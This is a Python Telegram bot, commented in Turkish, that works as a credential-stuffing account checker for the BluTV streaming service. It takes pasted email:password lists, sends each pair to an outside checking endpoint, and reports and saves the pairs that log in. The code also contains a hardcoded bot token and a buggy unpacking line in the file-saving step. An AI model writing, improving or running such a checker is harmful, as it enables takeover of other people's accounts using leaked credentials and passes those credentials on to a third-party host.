import requests
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# Botunuzun token'ını buraya girin
TELEGRAM_TOKEN = '7844773916:AAGR_5wf8wblT74gM3Ir9LZdUCu550LaNWY'


# Email:Password kombinasyonlarını kontrol eden fonksiyon
def check_login(email, password):
    try:
        # Verdiğiniz URL'yi kullanarak API'ye istek gönderiyoruz
        url = f"https://wizardxcoder.com/blutv.php?email={email}&sifre={password}"
        response = requests.get(url)
        # API başarılı yanıt verdiğinde 'success' kelimesini arıyoruz
        if "success" in response.text.lower():
            return True
        else:
            return False
    except Exception as e:
        print(f"Error: {e}")
        return False


# /blu_tv komutunu işleyen fonksiyon
async def blu_tv(update: Update, context: CallbackContext):
    message = update.message.text[7:]  # /blu_tv komutundan sonra gelen kısmı alıyoruz
    email_password_list = message.split("\n")

    success_count = 0
    failed_count = 0

    # Her email:password kombinasyonunu kontrol et
    successful_logins = []  # Başarılı girişlerin listesi

    for entry in email_password_list:
        email, password = entry.strip().split(":")

        if check_login(email, password):
            success_count += 1
            successful_logins.append(f"Başarılı ✅: {email}:{password}")
        else:
            failed_count += 1
            await update.message.reply_text(f"Başarısız❌: {email}:{password}")

    # Başarıyla giriş yapılanları Telegram'a gönder
    for login in successful_logins:
        await update.message.reply_text(login)

    # Sonuçları gönder
    await update.message.reply_text(
        f"İşlem tamamlandı! Başarıyla giriş yapılan {success_count} adet kombinasyon var, {failed_count} başarısız giriş var.")

    # Başarıyla giriş yapılanları bir dosyaya kaydet
    with open('successful_logins.txt', 'a') as f:
        for entry in successful_logins:
            email, password = entry.split(":")[1].strip()
            f.write(f"{email}:{password}\n")

    # Sonuçlar kaydedildiğini bildiren mesaj
    await update.message.reply_text("Başarılı girişler successful_logins.txt dosyasına kaydedildi.")


# Ana fonksiyon
def main():
    application = Application.builder().token(TELEGRAM_TOKEN).build()

    # /blu_tv komutunu bağla
    application.add_handler(CommandHandler("blu_tv", blu_tv))

    # Botu başlat
    application.run_polling()


if __name__ == '__main__':
    main()
